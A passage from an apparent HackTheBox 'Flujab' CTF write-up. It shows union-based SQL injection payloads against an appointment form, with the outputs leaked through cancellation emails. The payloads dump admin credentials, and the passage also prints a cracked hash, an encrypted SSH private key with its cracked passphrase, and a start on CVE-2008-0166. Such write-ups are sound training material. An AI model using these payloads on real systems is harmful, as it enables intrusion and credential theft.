<span class="na">Content-Length</span><span class="p">:</span> <span class="s">65</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">Modus=Q29uZmlndXJlPVRydWU%3d; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/?smtp_config; Patient=f991b5fb6a2939471c7230b2db78225e; Registered=Zjk5MWI1ZmI2YTI5Mzk0NzFjNzIzMGIyZGI3ODIyNWU9VHJ1ZQ%3D%3D; expires=Thu, 13-Jun-2019 14:04:38 GMT; Max-Age=3600; path=/</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

nhsnum=test&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 13 Jun 2019 14:13:42 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">ClownWare Proxy</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">5204</span>
</code></pre></div></div>
<p>Now if we check the <code class="language-plaintext highlighter-rouge">smtp</code> server we can see that the cancellation email was sent successfully :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:13:40 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:
Message-ID: &lt;219504b93c84fb0e94fef1ae3d31707d@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : test
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>

<h2 id="sqli">SQLi</h2>
<p>I tried to play around with that input (<code class="language-plaintext highlighter-rouge">nhsnum</code>), I tried a lot of stuff and when I tried union based <code class="language-plaintext highlighter-rouge">sql</code> injection I got a hit (a good <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/Basic-Union-Based-SQL-Injection.html" target="_blank" rel="noopener noreferrer">reference</a>):
<br><img src="/images/hackthebox/flujab/59.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,@@datadir,4,5;#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p>This payload prints the data directory.<br>
<code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:20:32 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:/var/lib/mysql/
Message-ID: &lt;9bcabe79f1782598002cc31abc3bb333@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@datadir,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Database version :
<br><img src="/images/hackthebox/flujab/61.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,@@version,4,5;#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:24:50 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
Message-ID: &lt;d2e238de2ef64c5dd385e30472c94d5e@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,@@version,4,5;#
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Great. Let’s get the table name :
<br><img src="/images/hackthebox/flujab/63.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:28:15 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:admin
Message-ID: &lt;e389b6f96e0104edf7b12bd167666fb3@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--                              
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Table name is <code class="language-plaintext highlighter-rouge">admin</code> let’s get the column names :
<br><img src="/images/hackthebox/flujab/65.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='</span><span class="k">admin</span><span class="s1">'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:38:55 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:id
Message-ID: &lt;50be6357006cbedc546152de64cd5407@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin'--     
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>This gave us the first column name which is <code class="language-plaintext highlighter-rouge">id</code>, to get the rest of the column names we will add <code class="language-plaintext highlighter-rouge">and column_name!='PREVIOUS COLUMN NAME HERE'</code>.<br>
<br><img src="/images/hackthebox/flujab/67.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='</span><span class="k">admin</span><span class="s1">' and column_name!='</span><span class="n">id</span><span class="s1">'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:41:26 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:loginname
Message-ID: &lt;3d6a306c2827c5d6b3e44ae2c9602d2e@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Second column : <code class="language-plaintext highlighter-rouge">loginname</code>
<br><img src="/images/hackthebox/flujab/69.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='</span><span class="k">admin</span><span class="s1">' and column_name!='</span><span class="n">id</span><span class="s1">' and column_name!='</span><span class="n">loginname</span><span class="s1">'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:44:08 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:namelc
Message-ID: &lt;8a8dbbfb4a4c3a0968c819bc9e188e6c@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname'--
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Third column : <code class="language-plaintext highlighter-rouge">namelc</code>
<br><img src="/images/hackthebox/flujab/71.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='</span><span class="k">admin</span><span class="s1">' and column_name!='</span><span class="n">id</span><span class="s1">' and column_name!='</span><span class="n">loginname</span><span class="s1">' and column_name!='</span><span class="n">namelc</span><span class="s1">'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:46:45 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:email
Message-ID: &lt;087443e0a9489da3ec320a89cc3df41b@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc'--                                                                    
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Fourth column : <code class="language-plaintext highlighter-rouge">email</code>
<br><img src="/images/hackthebox/flujab/73.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='</span><span class="k">admin</span><span class="s1">' and column_name!='</span><span class="n">id</span><span class="s1">' and column_name!='</span><span class="n">loginname</span><span class="s1">' and column_name!='</span><span class="n">namelc</span><span class="s1">' and column_name!='</span><span class="n">email</span><span class="s1">'--+&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 15:48:47 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:access
Message-ID: &lt;f2306132c2238cf545023e952591045d@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='admin' and column_name!='id' and column_name!='loginname' and column_name!='namelc' and column_name!='email'--                                           
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>Fifth column : <code class="language-plaintext highlighter-rouge">access</code>
I stopped right there to see if that’s enough, let’s see what data can we get from these columns.<br>
<br><img src="/images/hackthebox/flujab/75.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,CONCAT(loginname,'</span><span class="p">:</span><span class="s1">',namelc,'</span><span class="p">:</span><span class="s1">',email,'</span><span class="p">:</span><span class="s1">',access),4,5 FROM admin#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:01:53 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:syadmin@flujab.htb:sysadmin-console-01.flujab.htb                                  
Message-ID: &lt;547797c2649862cadc98c5c5e345208b@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',email,':',access),4,5 FROM admin#                                          
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>We got a login name, an email address and a link to a sysadmin console. But we still need a password. I don’t know if I had to enumerate more until I get the column <code class="language-plaintext highlighter-rouge">password</code> but anyway I just added password hoping that there’s a column called password, and I was right :
<br><img src="/images/hackthebox/flujab/77.png" alt="" class="align-center"><br><br></p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nhsnum</span><span class="o">=</span><span class="s1">' UNION SELECT 1,2,CONCAT(loginname,'</span><span class="p">:</span><span class="s1">',namelc,'</span><span class="p">:</span><span class="s1">',password,'</span><span class="p">:</span><span class="s1">',email,'</span><span class="p">:</span><span class="s1">',access),4,5 FROM admin#&amp;submit=Cancel+Appointment&amp;submit=Cancel+Appointment
</span></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">smtp</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---------- MESSAGE FOLLOWS ----------
Date: Thu, 13 Jun 2019 16:03:22 +0100
To: cancelations@no-reply.flujab.htb
From: Nurse Julie Walters &lt;DutyNurse@flujab.htb&gt;
Subject: Flu Jab Appointment - Ref:sysadm:administrator:a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602:syadmin@flujab.htb:sysadmin-console-01.flujab.htb
Message-ID: &lt;783cf28dd5b1c56f309b9a45724c5ec5@freeflujab.htb&gt;
X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: text/plain; charset=iso-8859-1
X-Peer: 10.10.10.124

    CANCELLATION NOTICE!
  ________________________

    VACCINATION
    Routine Priority
    ------------------
    REF    : ' UNION SELECT 1,2,CONCAT(loginname,':',namelc,':',password,':',email,':',access),4,5 FROM admin#                             
    Code   : Influ-022
    Type   : Injection
    Stat   : CANCELED
    LOC    : Crick026
  ________________________

  Your flu jab appointment has been canceled.
  Have a nice day,

  Nurse Julie Walters
  Senior Staff Nurse
  Cricklestone Doctors Surgery
  NHS England.


------------ END MESSAGE ------------
</code></pre></div></div>
<p>let’s take a look at what we have :
<br><img src="/images/hackthebox/flujab/79.png" alt="" class="align-center"><br><br>
Password is a <code class="language-plaintext highlighter-rouge">sha256</code> hash. I used <a href="https://crackstation.net/" target="_blank" rel="noopener noreferrer">crackstation</a> to crack it :
<br><img src="/images/hackthebox/flujab/80.png" alt="" class="align-center"><br><br>
Password : <code class="language-plaintext highlighter-rouge">th3doct0r</code>
<br>I added <code class="language-plaintext highlighter-rouge">sysadmin-console-01.flujab.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> then I went to <code class="language-plaintext highlighter-rouge">http://sysadmin-console-01.flujab.htb/</code> :
<br><img src="/images/hackthebox/flujab/81.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/82.png" alt="" class="align-center"><br><br>
I got the direct ip access error again. But this time on port 8080 I didn’t get the same error :
<br><img src="/images/hackthebox/flujab/83.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/84.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">Ajenti</code> administration panel. (Note : It won’t be accessible if your ip wasn’t in the whitelist)</p>

<h2 id="cve-2008-0166-user-flag">CVE-2008-0166, User Flag</h2>
<p>After getting in the first thing I noticed was the notepad :
<br><img src="/images/hackthebox/flujab/85.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/86.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/87.png" alt="" class="align-center"><br><br>
Nice so we can read and write some stuff on the server. I checked the home directory and it had a lot of users with a lot of user flags ….<br>
<br><img src="/images/hackthebox/flujab/88.png" alt="" class="align-center"><br><br>
For example :
<br><img src="/images/hackthebox/flujab/89.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/90.png" alt="" class="align-center"><br><br>
But one user called <code class="language-plaintext highlighter-rouge">drno</code> had <code class="language-plaintext highlighter-rouge">.ssh</code> directory with a key in it.<br>
<br><img src="/images/hackthebox/flujab/91.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/92.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/93.png" alt="" class="align-center"><br><br>
<code class="language-plaintext highlighter-rouge">userkey</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6F8D2ABE85DA1FE16846D997BD04E40B

zPiYgS5/LZqDZr4tFLHiOsym/baRcXmGsYwD5bI2GdH8SaQFLzp5vuWGvYlPtFB8
w4BrkWpTp8GcMhTPXxu70iVpw2zRpfsUYBDasNvydexzIWZETs9rQnvTqslxCQz5
wMILkyVB4V2223X83ym3y/4I9dduVsqq9WAyOUn2fW4nIQb8SJ3CfxN2Ynq/bJay
v+fmPexUoCiYQR80QuNoqdhSUKVCmgS2ONWg7DLIIl9U+EhpRrd/6iqBF6YE/xKq
OoOSSiIIzaLA1EJPoNF4xueqyqbek3OApuDAzblxTMWL3G7qKaHWPzk93qdRS+Hy
gpYYy2vVmAG0R9c37pGs9LA1zM2OfALz4kHAErcHa+/E29FIv7verD2xOtcV93K1
thkAdv++tIuOE4ChHX6XZn4pvtTceHQYjHbHur2KBenzR/M8i3fuXPp7BHHMGJWT
jRn6aHN2qDio8IAVCcjPonWQ3yKVr21Xx8fJ9QcNLoUld9EPv3sOcSdegu7yOWyf
RUDgtdtz3Nw7z7QkwEKO+NE6f+iFQ/3s0qxcn8MRTCvquun4K4WcSTepbacd2ulT
jSnjBlVNVKvICaLZ1ulfOMXN/H0b1fVTjCxE3lbih7gpJb6jzvl7w+mJCgzPRgm/
S9xnnM+LinVh5NGNZj3Itaay3DZLAcY4MP03E77yu7BfaqnIw0yWUOiLslekhG2K
nWQoaMsxIOLrlTotvTB+uoRvxEu2qGmV8HbGgSkb6rqoFbVXcJYgDw2ZmDhDoGfH
M6Ud9IcBOsve1BsfhJepQtm/4JhsRv3alzIu1YuRvWeNINk6R7nDE8Et7xlnWqKT
0QB6pfOYSOkLpO8l71OvGnKWz3iRbe2+1qooW26O3VK38b2rZ316QeXkBt5giayw
4L8jU9ttEYAH/VgHXfQTfMm1BIUSCQWEL0yv5Lg7XYszYn3jnDgc39XbUATYBE5o
GAz2H3B4w7SjU8Swga7ZaoIq97trAFZIa1zaaow67+o6h9W49oMlBoDsL1+HFAv2
hvzmY0ycsisrSlSdb6DPDfA+0KErrXGu54PT+j3qhr67CdjWPkK1yz7+jeATf+DR
i+tYHty6t8AsilotmNHCYfXszOsnk5xNP6CZV8WbcXUB01FGzuVE1+bQ0YsuVuUd
hiEMZVTvG4L70u7zWckeAzvj5nSK0zHXYHg7ZkkOwJ+9CKGshGOhawbV4nfCPx1a
q6EXq9Onf6LAdXVWexCXjaFj5lvgBdYTxRL1ODMAmfpAuwYgq6iIjTz8Kc08U83e
h+M4tQlajjSjsY4FmSmM8c8Nl7aPyBxk9bEkhzCW2TE7RuSBfH1lLS2jbXsM/csl
BlLL6+kjbRWHmmTk90xkkIYnkOOeA3klzYHWrDj3X86c/p02cOoVWSUFr5a1Kxul
9iDmxMcYSBCp77+gedT5kB+1gOqrk60lfAgJWxi0CqAhzjMfP4p/n3NkrKT6R+jI
LSLiIuex63EKHhEdZISPsG9/cMBSckZ/oh86TQuZVagkXcQpIpNKEWwIv4yJIbji
ISRFtN80+FMrhQf/+CLpoK5RHRNXNq38ztg2GJVPiTN0rN+3Vk0ZI6PeZVuHzW7r
-----END RSA PRIVATE KEY-----
</code></pre></div></div>
<p>Unfortunately it was encrypted so I used <code class="language-plaintext highlighter-rouge">ssh2john</code> then I cracked it :
<br><img src="/images/hackthebox/flujab/94.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/95.png" alt="" class="align-center"><br><br>
Password : <code class="language-plaintext highlighter-rouge">shadowtroll</code>
<code class="language-plaintext highlighter-rouge">chmod 600 drno.key</code>, then I used the key to ssh as <code class="language-plaintext highlighter-rouge">drno</code> and we got the user flag :
<br><img src="/images/hackthebox/flujab/96.png" alt="" class="align-center"><br><br>
Nope we only got a connection reset. I went back to the administration panel and took a look at <code class="language-plaintext highlighter-rouge">/etc/hosts.allow</code> :
<br><img src="/images/hackthebox/flujab/97.png" alt="" class="align-center"><br><br>
I added my ip address and tried again :
<br><img src="/images/hackthebox/flujab/98.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/99.png" alt="" class="align-center"><br><br>
Still a connection reset. I went back and added <code class="language-plaintext highlighter-rouge">sshd : ALL</code>
<br><img src="/images/hackthebox/flujab/100.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/flujab/101.png" alt="" class="align-center"><br><br>
It worked but now it doesn’t accept the key. It was just a troll. Anyway we got the public key in <code class="language-plaintext highlighter-rouge">authorized_keys</code> :
<br><img src="/images/hackthebox/flujab/102.png" alt="" class="align-center"><br><br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
</code></pre></div></div>
<p>I tried <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166" target="_blank" rel="noopener noreferrer"><code class="language-plaintext highlighter-rouge">CVE-2008-0166</code></a>. I downloaded the files from <a href="https://github.com/g0tmi1k/debian-ssh" target="_blank" rel="noopener noreferrer">here</a> then I extracted them in a directory called <code class="language-plaintext highlighter-rouge">cve-2008-0166</code>. Then I used <code class="language-plaintext highlighter-rouge">grep</code> to search for the last line in the public key :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE
</code></pre></div></div>
<p>through all files :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>grep -r -n "Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE" cve-2008-0166/*
</code></pre></div></div>
